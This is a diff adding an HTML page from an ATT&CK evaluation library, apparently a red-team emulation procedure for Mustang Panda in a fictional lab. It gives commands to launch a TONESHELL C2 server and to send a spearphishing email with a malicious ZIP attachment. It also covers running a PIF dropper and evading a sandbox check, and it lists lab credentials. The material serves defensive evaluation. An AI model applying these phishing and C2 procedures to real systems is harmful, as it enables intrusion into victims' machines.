@@ -1,0 +1,1073 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-ST8G6EL3M2"></script>
+    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-ST8G6EL3M2');</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.818693826522">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.11.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Protections Test 4 Scenario</title>
+    <meta name="title" content="Protections Test 4 Scenario">
+    <meta name="description" content="☣️ Initiate an RDP session to the Kali attack host driftmark (174.3.0.70)">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/mustang_panda/emulation_plan/protections_test_4_scenario/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/mustang_panda/emulation_plan/protections_test_4_scenario/">
+    <meta property="og:title" content="Protections Test 4 Scenario">
+    <meta property="og:description" content="☣️ Initiate an RDP session to the Kali attack host driftmark (174.3.0.70)">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/mustang_panda/emulation_plan/protections_test_4_scenario/">
+    <meta property="twitter:title" content="Protections Test 4 Scenario">
+    <meta property="twitter:description" content="☣️ Initiate an RDP session to the Kali attack host driftmark (174.3.0.70)">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../favicon.png" rel="icon">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.818693826522" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.818693826522" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.818693826522" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.818693826522" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+    
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav id="retype-header-nav" class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="retype-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+    
+        <div id="retype-container" class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 bg-body-bg">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="retype-markdown" id="retype-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <nav id="retype-breadcrumb" class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Enterprise
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/mustang_panda/" class="pr-4">
+                                                Mustang Panda
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/mustang_panda/emulation_plan/" class="pr-4">
+                                                Mustang Panda Emulation Plans
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../enterprise/mustang_panda/emulation_plan/protections_test_4_scenario/" class="pr-4">
+                                                Protections Test 4 Scenario
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="protections-test-4-scenario" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#protections-test-4-scenario">#</doc-anchor-trigger>
+        <span>Protections Test 4 Scenario</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span>Setup</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Initiate an RDP session to the Kali attack host <code v-pre>driftmark (174.3.0.70)</code></p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>174.3.0.70</td>
+<td>op1</td>
+<td>Barbed-Directive</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In a new terminal window, start the simple file server and TONESHELL handler
+<strong>if they are not already running</strong>:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd /opt/kalidev/mustang_panda/controlServer/
+sudo go build -o controlServer main.go
+sudo ./controlServer -c config/protections.yml</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">...
+[SUCCESS] 2024/04/01 10:10:11 Started handler simplefileserver
+[SUCCESS] 2024/04/01 10:10:11 Started handler toneshell
+[INFO] 2024/04/01 10:10:11 Waiting for connections</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Initiate an RDP session to the jumpbox <code v-pre>dreadfort (10.26.3.125)</code></p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>12.78.110.37</td>
+<td>op1</td>
+<td>Barbed-Directive</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+</ul>
+<doc-anchor-target id="step-1---initial-access">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---initial-access">#</doc-anchor-trigger>
+        <span>Step 1 - Initial Access</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Mustang Panda sends an email from <code v-pre>dnaharis@pentos.com</code> to <code v-pre>btully@vale.net</code> containing
+a .zip file attachment. <code v-pre>btully</code> downloads and unzips the .zip file which
+contains 2 subfolders. The first subfolder <code v-pre>Appendix I</code> contains a PIF file
+<code v-pre>Assessing Westeros-Essos Global Influence.pif</code>, which is the TONESHELL dropper
+executable masquerading as a PIF file, while the second subfolder <code v-pre>Appendix II</code>
+contains a PDF file <code v-pre>Assessing Westeros-Essos Global Influence (1).pdf</code>.</p>
+<p>When
+<code v-pre>btully</code> opens the PIF file (executes the TONESHELL dropper), the TONESHELL dropper
+checks for the presence of <code v-pre>GFlagEditor</code> in <code v-pre>C:\ProgramData</code>. If it does not
+exist, the TONESHELL dropper will create the folder <code v-pre>C:\ProgramData\GFlagEditor</code>
+and drop a legitimate binary <code v-pre>gflags.exe</code> and the TONESHELL loader <code v-pre>gflagsui.dll</code>
+into it. The TONESHELL dropper then opens the decoy PDF and creates a scheduled
+task to execute the legitimate binary.</p>
+<doc-anchor-target id="procedures-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-1">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>From the jumpbox, initiate an RDP session to the workstation <code v-pre>bitterbridge (10.26.4.103)</code></p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bitterbridge.vale.net</td>
+<td>vale\btully</td>
+<td>Finished-Debug</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>On the workstation <code v-pre>bitterbridge (10.26.4.103)</code>, open FireFox and browse to the
+Outlook Web Access portal, logging in with btully&#x27;s credentials</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://godswood.vale.net/owa">https://godswood.vale.net/owa</a></td>
+<td>vale\btully</td>
+<td>Finished-Debug</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Switch to the Kali and open a new terminal to activate the Python virtual
+environment then send the spearphishing email</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd /opt/kalidev/
+source venv/bin/activate
+python3 /opt/kalidev/mustang_panda/Resources/email_generation/send_email.py mail.pentos.com /opt/kalidev/mustang_panda/Resources/payloads/p4_spearphishing.html -t btully@vale.net -f dnaharis@pentos.com -fn 'Daario Naharis' -s 'Westeros-Essos Cyber Summit Read-Ahead Preparation' -a /opt/kalidev/mustang_panda/Resources/payloads/protections4.zip -an 'Assessing Westeros-Essos Global Influence.zip'</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Successfully sent email</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p>Switch to the RDP to the workstation <code v-pre>bitterbridge (10.26.4.103)</code> and confirm
+receipt of the spearphishing email</p>
+</li>
+<li><p>Open the email and click to download the attachment <code v-pre>Assessing Westeros-Essos Global Influence.zip</code></p>
+</li>
+<li><p>Open the Downloads folder, right-click the ZIP file <code v-pre>Assessing Westeros-Essos Global Influence.zip</code>, click &quot;Extract All...&quot;, then click &quot;Extract&quot;</p>
+</li>
+<li><p>Navigate into the <code v-pre>Appendex I</code> directory and double-click to execute the PIF
+file <code v-pre>Assessing Westeros-Essos Global Influence.pif</code>, and click &quot;Run&quot;. Wait
+until a CMD prompt flashes with <code v-pre>GFlagEditor</code> in the window name then switch
+windows several times to bypass the sandbox check</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Switch to Kali then wait 5-8 minutes for C2 registration</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial Access</td>
+<td>T1566.001</td>
+<td>Phishing: Spearphishing Attachment</td>
+<td>Windows</td>
+<td>btully received an email from <a href="mailto:dnaharis@tyrosh">dnaharis@tyrosh</a>[.]com containing an Assessing Westeros-Essos Global Influence.zip attachment</td>
+<td>Calibrated - Not Benign</td>
+<td>Mustang Panda sends a spearphishing attachment <code v-pre>Assessing Westeros-Essos Global Influence.zip</code> to <code v-pre>btully</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/email_generation/send_email.py">send_email.py</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html" class="outbound" target="_blank"><span>21</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf" class="outbound" target="_blank"><span>19</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1027.013</td>
+<td>Obfuscated Files or Information: Encrypted/Encoded File</td>
+<td>Windows</td>
+<td>btully downloaded Assessing Westeros-Essos Global Influence.zip and extracted the contents</td>
+<td>Not Calibrated - Not Benign</td>
+<td><code v-pre>btully</code> downloads and extracts the contents of the ZIP file <code v-pre>Assessing Westeros-Essos Global Influence.zip</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td>-</td>
+<td><a href="https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html" class="outbound" target="_blank"><span>21</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf" class="outbound" target="_blank"><span>19</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 